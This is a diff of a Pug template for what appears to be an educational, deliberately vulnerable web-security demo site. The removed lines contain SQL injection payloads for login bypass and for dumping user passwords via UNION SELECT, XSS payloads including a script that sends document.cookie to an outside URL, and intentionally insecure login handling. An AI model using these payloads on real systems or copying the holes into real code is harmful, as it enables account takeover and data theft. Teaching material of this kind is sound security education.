@@ -4,37 +4,16 @@ html
     title= title
     block stylesheets
       link(rel='stylesheet', href='/stylesheets/style.css')
-      script(src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js")
   body
     .menu
-      h1 #{title} #[button(type="submit" onclick="autoLogin();") See Data]
+      h1= title
     nav#side-menu-1
       section#side-content
-        .button_bar
-          .dropdown 
-            .dropdown-header(onclick='toggleDropdown(this)') Choose Attack
-            .dropdown-content
-              #[button(type="submit" onclick="swapGuide(1, 0);") SQL Injection]
-              #[button(type="submit" onclick="swapGuide(2, 0);") Cross-Site Scripting]
-          section#prev-button-atk #[button(type="submit" onclick="swapGuide(-1, -1);") Prev Page]
-          section#next-button-atk #[button(type="submit" onclick="swapGuide(-1, 1);") Next Page]
-        p#attack-content Choose a potential Attack to get started.
-    nav#side-menu-2
-      section#side-content
-        .button_bar
-          .dropdown 
-            .dropdown-header(onclick='toggleDropdown(this)') Choose Defense
-            .dropdown-content
-              #[button(type="submit" onclick="swapGuide(1, 0);") Data Hashing]
-              #[button(type="submit" onclick="swapGuide(2, 0);") Input Sanitisation]
-              #[button(type="submit" onclick="swapGuide(3, 0);") Input Encoding]
-          section#prev-button-def #[button(type="submit" onclick="swapGuide(-1, -1);") Prev Page]
-          section#next-button-def #[button(type="submit" onclick="swapGuide(-1, 1);") Next Page]
-        p#defence-content Choose a Defensive Method to get started.
+        p Here is the side bar content
     
     section#main-content
       div(style='display: flex; justify-content: space-between; flex-wrap: wrap;')
-        div: button#side-menu-toggle-1 Attack
+        div: button#side-menu-toggle-1 HELP
         div(style='text-align: center; width: 100px;')
           label.switch
             if p.charAt(0)=='0'
@@ -66,88 +45,21 @@ html
             span.slider.round
           div URL Safety Level
         div
-      button#side-menu-toggle-2 Defense 
-      p Please Log In:
-      p: #[input(type="text" id="username")] #[input(type="text" id="password")] #[input(type="submit" onclick="tryLogin();")]
-      
-      if user != null && user != 'null' && user != ''
-        if ACCEPT
-          if p.charAt(1) != '2' && user
-            p SUCCESSFULLY LOGGED IN AS !{user}.
-          else 
-            p SUCCESSFULLY LOGGED IN AS #{user}.
-        else
-          if p.charAt(1) != '2' && user
-            p ATTEMPTED TO LOG IN AS !{user}. FAILED
-          else 
-            p ATTEMPTED TO LOG IN AS #{user}. FAILED
+  
+      p THIS IS THE INDEX PAGE #[button(type="submit" onclick="enterSite();") Go to Site]
+
     script.
       window.onload = function() {
-        help = parseInt(#{h.charAt(0)});
-        module = parseInt(#{h.charAt(1)});
-        page = parseInt(#{h.charAt(2)});
-        if (module == 0) { page = 0; }
+        help = 0;
         EncryptLv = parseInt(#{p.charAt(0)});
         InSafeLv = parseInt(#{p.charAt(1)});
         UrlSafeLv = parseInt(#{p.charAt(2)});
-        uCookie = !{JSON.stringify(user)};
-        if (window.location.href.includes('/out')) {
-          uCookie = '';
-          refreshProtections();
-          window.location.href = '/login'+getQueries();
-        }
         refreshProtections();
-        document.getElementById("prev-button-atk").style.display = 'none';
-        document.getElementById("next-button-atk").style.display = 'none';
-        document.getElementById("prev-button-def").style.display = 'none';
-        document.getElementById("next-button-def").style.display = 'none';
-        if (help) {
-          // upon reload the help box stays open by updating it with this element
-          document.getElementById('side-menu-1').classList.add('notransition');
-          document.getElementById('side-menu-2').classList.add('notransition');
-          document.getElementById('main-content').classList.add('notransition');
-          see_help(help);
-          document.getElementById('side-menu-1').offsetHeight;
-          document.getElementById('side-menu-1').classList.remove('notransition');
-          document.getElementById('side-menu-2').offsetHeight;
-          document.getElementById('side-menu-2').classList.remove('notransition');
-          document.getElementById('main-content').offsetHeight;
-          document.getElementById('main-content').classList.remove('notransition');
-
-          var openPage = page;
-          swapGuide(module, 0);
-          swapGuide(-1, openPage);
-        }
       };
-      function autoLogin() {
-        uCookie = null;
-        refreshProtections();
-        if (UrlSafeLv > 1) {
-          window.location.href='/data'+getQueries()+'&s=';
-        } else {
-          window.location.href='/data'+getQueries()+'&s=&i=&g=';
-        }
+      
+      function enterSite() {
+        window.location.href='/login'+getQueries();
       }
-      function tryLogin() {
-        if (UrlSafeLv >= 2) {
-          uCookie = (encodeURIComponent(document.getElementById("username").value) || '') + '::' + (hash(document.getElementById("password").value) || 'null');
-          refreshProtections();
-          window.location.href = '/login'+getQueries();
-        } else {
-          uCookie = encodeURIComponent(document.getElementById("username").value) || '';
-          password = hash(encodeURIComponent(document.getElementById("password").value)) || '';
-          refreshProtections();
-          window.location.href = '/login/'+uCookie+'/'+password+getQueries();
-        }
-      }
-      function hash(plaintext) {
-        if (EncryptLv > 0) {
-          return CryptoJS.SHA256(plaintext).toString();
-        } else {
-          return plaintext;
-        }
-      }
-
       function flip_help(h) {
         if (help == 0 || help != h){
           help = h;
@@ -170,175 +82,28 @@ html
       }
 
       function refreshProtections() {
-        document.cookie = 'HelpOn=' + help.toString() + module.toString() + page.toString() + '; path=/';
         document.cookie = 'Protections=' + EncryptLv.toString() + InSafeLv.toString() + UrlSafeLv.toString() + '; path=/';
-        document.cookie = 'User=' + uCookie + '; path=/';
         document.cookie = 'GenreId=0; path=/';
         document.cookie = 'ItemNum=0; path=/';
       }
       function getQueries() {
-        return '?p=' + EncryptLv.toString() + InSafeLv.toString() + UrlSafeLv.toString() + '&h=' + help.toString() + module.toString() + page.toString();
+        return '?p=' + EncryptLv.toString() + InSafeLv.toString() + UrlSafeLv.toString();
       }
 
       function see_help() {
-        var menu1 = document.getElementById('side-menu-1');
-        var menu2 = document.getElementById('side-menu-2');
+        var menu = document.getElementById('side-menu-1');
         var mainContent = document.getElementById('main-content');
-        if (help==0) {
-          menu1.style.left = '-300px';
-          menu2.style.left = '-300px';
+        if (help) {
+          menu.style.left = '-300px';
           mainContent.style.marginLeft = '20px';
           document.getElementById('side-menu-toggle-1').style.border = 'none';
-          document.getElementById('side-menu-toggle-2').style.border = 'none';
-        } else if (help==1) {
-          menu1.style.left = '0px';
-          menu2.style.left = '-300px';
+        } else {
+          menu.style.left = '0px';
           mainContent.style.marginLeft = '320px';
           document.getElementById('side-menu-toggle-1').style.border = 'solid';
-          document.getElementById('side-menu-toggle-2').style.border = 'none';
-        } else if (help==2) {
-          menu1.style.left = '-300px';
-          menu2.style.left = '0px';
-          mainContent.style.marginLeft = '320px';
-          document.getElementById('side-menu-toggle-1').style.border = 'none';
-          document.getElementById('side-menu-toggle-2').style.border = 'solid';
         }
       }
       document.getElementById('side-menu-toggle-1').addEventListener('click', function() {
-        tempHelp = help;
-        help = 2; swapGuide(0, 0);  // clear defence page iff was open
-        help = tempHelp;
         flip_help(1);
         see_help();
       });
-      document.getElementById('side-menu-toggle-2').addEventListener('click', function() {
-        tempHelp = help;
-        help = 1; swapGuide(0, 0);  // clear attack page iff was open
-        help = tempHelp;
-        flip_help(2);
-        see_help();
-      }); 
-
-      function swapGuide(new_module, page_swap) {
-        if (new_module != -1) {
-          module = new_module;
-          page = 0;
-        } else {
-          page += page_swap;
-        }
-        if (help == 1) {
-          let content = document.getElementById("attack-content");
-          //content.innerHTML = module.toString() + page.toString();
-          if (module == 0) {
-            document.getElementById("prev-button-atk").style.display = 'none';
-            document.getElementById("next-button-atk").style.display = 'none';
-            content.innerHTML = 'Choose a potential Attack to get started.';
-          } else if (module == 1) {
-            if (page == 0) {
-              document.getElementById("prev-button-atk").style.display = 'none';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->SQL Injection 0<br><br>Many websites store data in Databases (DBs), from which data is retrieved using a language called SQL. On /login for example, entered username & password are used in a <u><b>query</b></u> that compares them to stored users in the DB. <br><br>By weaponising our input, we can trick the DB into executing our own code using a technique called SQL Injection. <br><br>In this guide we will investigate the steps of such an attack, including the process of learning if the website is <b>susceptible</b> to SQL Injection, how to enter our code, and what code we can enter.';
-            } else if (page == 1) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = "-->SQL Injection 1<br><br>In order to do SQL Injection, a website has to be specifically vulnerable and cannot do Input Sanitisation or Input Encoding (go check out their sections in Defence for why). On this step, we are going to be testing the website to see if it is vulnerable to an attack.<br><br>Recall that the entered username and password are placed into a SQL query, in particular if you entered Jane then the SQL Query would ask if user='Jane'. Note that Jane is put into <u>quotation marks</u> - this will always be the case in an SQL Query.<br><br>This begs the question - if we entered our own quotation mark ('), what would occur, as the query would now include user='''? As it happens, if there are protections like Input Sanitisation then nothing will happen, but if there are not then we will receive an error!! Try it out, turning on and off Sanitisation, to prove this.";
-            } else if (page == 2) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = "-->SQL Injection 2<br><br>The receipt of an error tells us that potentially harmful inputs are <u>not</u> dealt with, and therefore SQL Injection is a possibility.<br><br> The next step is to figure out how to inject some SQL code.<br><br>The reason a quotation mark causes error is because when a quote is opened it must be subsequently closed. What we have done by entering the mark to get user=' ' ' is that now <b>our</b> quote (the middle one) closes the first quote, leaving the third quote on its own, hence the error.<br><br>However, by closing the first quote, the space before the third quote will be entered into the query as <u>SQL Code</u>. Additionally, if we comment out the third quotation mark then we can get rid of the former error. This can be done using a hash (#).<br><br>To sum up, this means if we enter a quotation mark at the start, and a hash at the end, we can enter SQL code in between.";
-            } else if (page == 3) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = "-->SQL Injection 3<br><br>If we start our input with a quotation mark, we can start writing SQL code. If we end our input with a hash, we can comment out the remaining SQL so the website focuses on our injected code which we can put in between. <br><br>In the case of the /login page, we can use this to forcibly log us in to someone else’s account. First, we need to make some deductions on the format of the current query, so we can effectively manipulate it to our advantage.<br><br>We know our entered username is placed directly into the existing query, this means as the website reads through the DB of users it is comparing each of their usernames to what we entered. This will be formatted using the syntax WHERE user=[our input], where a true condition will log us in.<br><br>We can therefore force the condition to always be true with a simple <br><br> ' OR TRUE #";
-            } else if (page == 4) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = "-->SQL Injection 4<br><br>Let’s increase our scope to some more advanced SQL, moving over to the /data page, where once again entering a quotation mark into the search bar reveals susceptibility to SQL Injection. Try entering '# like before, however, this does not cancel out the error like before!!<br><br>SQL Queries can be written in many different ways and Injection formatting tends to require a lot of trial and error. In this case, the query is embedded in brackets and we actually need to enter ')# to prevent the error.<br><br>With this in mind we need to inject our code a little differently, accounting for this change. For example, try entering <br><br>' LIMIT 1) #";
-            } else if (page == 5) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = "-->SQL Injection 5<br><br>We know now how to inject code into the /data query, we also know that what is returned is a table of data. If the website already prints one table of data to screen, can we make it print a different one?<br><br>To do this we need to empty the first table then add in data from the other table. Don’t worry too much about the technicalities but using a little advanced SQL (and the LIMIT we used in the last step), we get<br><br>' LIMIT 0) UNION ALL (SELECT user AS title, '' AS Director, pass AS TopTwoActors, '' AS releaseDate, '' AS movieId FROM Users) # <br><br>This will throw an error, but when you execute this, pay attention to the message before proceeding to the next step.";
-            } else if (page == 6) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = "-->SQL Injection 6<br><br>Oh no, it did not work! The movies and users data don’t match appropriately to do this union. Luckily we can get around this without too much difficulty but with a bit of sleuthing. We found earlier that the Users table has two notable columns user and pass, and we can also get the column names of the movie data straight from the table shown. With this in mind we can reformat our input to match the Movies and Users tables together using<br><br>' LIMIT 0) UNION ALL (SELECT user AS title, '' AS Director, pass AS TopTwoActors, '' AS releaseDate, '' AS movieId FROM Users) #<br><br>Note that this time it works!!";
-            } else if (page == 7) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'none';
-              content.innerHTML = '-->SQL Injection 7<br><br>Congratulations! You managed to craftily use SQL Injection to retrieve a list of users and their passwords. Try re-running the same command with Hashing on to see the difference in returned text.<br><br>Did you see how in just one simple bit of text we could gain unlawful access or reveal such sensitive information? SQL Injection can cause catastrophic damage to a system, but luckily there is a solution. If you try any of the inputs we’ve talked about, but now with Sanitisation on, you will see them no longer work!<br><br>Go read about Input Sanitisation in its respective section in Defences to learn more…';
-            }
-          } else if (module == 2) {
-            if (page == 0) {
-              document.getElementById("prev-button-atk").style.display = 'none';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 0<br><br>Website frontend pages have their data rendered using HTML. This allows formatting of text, tables and photos, however it cannot run code - instead HTML uses script tags to embed javascript to execute. For example, the /login page can use embedded code to hash the inputted password for more safe sending. <br><br>An attacker can take advantage of this isolated script environments in order to add their own code. Doing so is called Cross-Site Scripting, or XSS for short. With this, one can steal valuable data from users by injecting malicious code for them to run.<br><br>For this exercise, certain data will be changed, for which you need to relocate to /login/out to undo each step before moving on.';
-            } else if (page == 1) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 1<br><br>First we need to know if a website is XSS exploitable. This technique can only work on websites that do not employ some basic defences, such as <u>Input Encoding</u> which you can read more about in its respective Defence section. To verify this, try entering the following text to either page with Encoding on and off. <br><br> &lt;script&gt; alert("helloworld") &lt;/script&gt; <br><br>How this works is that our input is assigned to a variable as normal, which the website attempts to reprint back to us. However, as our text uses the script tags, in trying to print it instead runs the inputted code. In this case, a pop-up is shown. <br><br>Now we know, with Encoding off, we can inject code that the website is forced to run.';
-            } else if (page == 2) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 2<br><br>The alert we just ran is not damaging, but let’s see the kind of harm that an attacker could do by making the command more malicious. With Cross-Site Scripting, an attacker can steal users’ cookies.<br><br>Cookies are stored on a user-by-user basis and can indicate some very important information. One particularly important item is a user’s session-cookie, which gives them their access rights to the website. If these get stolen, the thief can access the user’s session to make changes with their privilege. <br><br>A simple way to reveal stored cookies is by linking users and sending their cookies with them, for example try the following input while noting what it says in the url:<br><br>&lt;script&gt; window.location= "https://google.com?"+document.cookie &lt;/script&gt;';
-            }  else if (page == 3) {
-              document.getElementById("prev-button-atk").style.display = 'block';
-              document.getElementById("next-button-atk").style.display = 'none';
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 3<br><br>By setting up their own website that listens to the received cookies, an attacker will be given this data. Distribute this to all users at the same time? <br><br>This clearly has some large implications for a wide user base with just a single simple input. It is therefore of great importance that this is protected against, and can be done with ease with some basic input safety such as via sanitisation or encoding.';
-            } 
-          }
-        } else if (help == 2) {
-          let content = document.getElementById("defence-content");
-          if (module == 0) {
-            document.getElementById("prev-button-def").style.display = 'none';
-            document.getElementById("next-button-def").style.display = 'none';
-            content.innerHTML = 'Choose a Defensive Method to get started.';
-          } else if (module == 1) {
-            if (page == 0) {
-              document.getElementById("prev-button-def").style.display = 'none';
-              document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Data Hashing 0<br><br>When we set up defences on our website, we do so in order to keep our data safe from reach to view, change or delete, but we can never be comprehensive. We can never reach a point of 100% security and therefore we must ask the question - what if our data is acquired? We need to ensure the data, if reached, is not usable - this generally comes through the last line of defence of encrypting information. <br><br>We saw in the SQL Injection tutorial that it is possible to retrieve the user-base and print it to screen. If this happens we can login with someone else’s data, however when we had Data Hashing turned on we instead retrieved much more obscure information. The user information could not be directly read and used as usernames and passwords could not be discerned. The aim, of course, is for this encrypted data to be as unusable as possible - different methods have varying levels of success…';
-            } else if (page == 1) {
-              document.getElementById("prev-button-def").style.display = 'block';
-              document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Data Hashing 1<br><br>';
-            } else if (page == 2) {
-              document.getElementById("prev-button-def").style.display = 'block';
-              document.getElementById("next-button-def").style.display = 'none';
-              content.innerHTML = '-->Data Hashing 2<br><br>';
-            }
-          } else if (module == 2) {
-            if (page == 0) {
-              document.getElementById("prev-button-def").style.display = 'none';
-              document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Input Sanitisation 0<br><br>Injection techniques can wreak havoc on a system and its data, retrieving things that should not be seen or touched, or assuming capabilities beyond what we designed our website to do. Nevertheless, in many cases there is a simple solution of managing the input more closely and blocking such attempted behaviour. This comes in a few forms. <br><br>First we reduce the amount of ways to enter data to a minimum, replacing potentially vulnerable text inputs with buttons, drop-downs and switches where possible. The step after this is managing the data that is inputted with input sanitisation, where we scrutinise and analyse inputted text to only use it if it is deemed safe.<br><br>The best way for this to work is to have a function or class that handles such things separately, which we can call upon to check a string before using it for a task. This class would be an Input Sanitiser.';
-            } else if (page == 1) {
-              document.getElementById("prev-button-def").style.display = 'block';
-              document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Input Sanitisation 1<br><br>';
-            } else if (page == 2) {
-              document.getElementById("prev-button-def").style.display = 'block';
-              document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Input Sanitisation 2<br><br>';
-            } else if (page == 3) {
-              document.getElementById("prev-button-def").style.display = 'block';
-              document.getElementById("next-button-def").style.display = 'none';
-              content.innerHTML = '-->Input Sanitisation 3<br><br>';
-            }
-          } else if (module == 3) {
-            if (page == 0) {
-              document.getElementById("prev-button-def").style.display = 'none';
-              document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Input Encoding 0<br><br>In the Attack: XSS section you may have seen how inputs can act differently when embedded in tags, particularly scripts. This is because of the formatting of HTML that means these tags allow entered text to act in a particular way, rather than exist as simple plaintext. The difference between the two are that specific characters have specific meanings. These different uses can be rendered meaningless if we force the text to be interpreted as a raw string, and the process which can do this is Encoding.<br><br>Character Encoding assigns an input into specific codes that must be individually and independently interpreted as regular characters. Using this means if someone were to input some XSS, it will be read and used as is without running any code. Try inputting that as a search query on /data with Input Encoding on to try this out.';
-            } else if (page == 1) {
-              document.getElementById("prev-button-def").style.display = 'block';
-              document.getElementById("next-button-def").style.display = 'block';
-              content.innerHTML = '-->Input Encoding 1<br><br>';
-            } else if (page == 2) {
-              document.getElementById("prev-button-def").style.display = 'block';
-              document.getElementById("next-button-def").style.display = 'none';
-              content.innerHTML = '-->Input Encoding 2<br><br>';
-            }
-          }
-        }
-        refreshProtections();
-      }
